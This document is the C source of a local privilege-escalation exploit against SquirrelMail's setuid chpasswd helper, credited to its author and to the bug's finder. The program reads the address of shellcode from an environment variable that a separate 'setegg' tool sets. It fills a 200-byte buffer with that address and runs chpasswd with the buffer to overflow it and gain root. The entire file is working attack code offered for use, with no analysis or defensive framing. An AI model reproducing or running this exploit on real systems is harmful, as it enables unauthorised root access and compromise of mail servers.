/*
** Squirremail's chpasswd local root exploit bY SpikE <spike_vrm at mail.com>
** Bug found bY Matias Neiff <matias at neiff.com.ar>
**
** Usage: Execute setegg before running this exploit
**
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>

#define BUFSIZE 200

char *Egg;
int EggAddr;
char *chpasswd;

void doExploit()
{
 char Buffer[BUFSIZE];
 int *Ptr = (int *)Buffer;
 int i;

 fprintf(stdout,"[+] Egg address: %#010x\n",EggAddr);

 // Build evil buffer
 for(i=0;i<BUFSIZE-4;i+=4)
  *Ptr++ = EggAddr;
 *Ptr = 0;

 // eXplot it!!
 execl(chpasswd,"chpasswd",Buffer,"SPK","HACKED",0);

 // If reach here, error
 fprintf(stdout,"[-] %s not found!!!\n",chpasswd);
}

int main(int argc, char **argv)
{
 printf("==[ Squirremail's chpasswd local root exploit bY SpikE <spike_vrm@mail.com> ]==\n\n");
 if(argc != 2)
 {
  printf("Usage: %s <chpasswd-full-path>\n\n",argv[0]);
  exit(0);
 }
 chpasswd = argv[1];
 // Get shellcode address
        Egg = getenv("spkEGG");
        EggAddr = (int)&Egg[0];

 if(EggAddr == 0)
 {
  printf("[-] spkEGG not found. Run \"setegg\" first.\n");
  exit(-1);
 }
 doExploit();

 return(0);
}
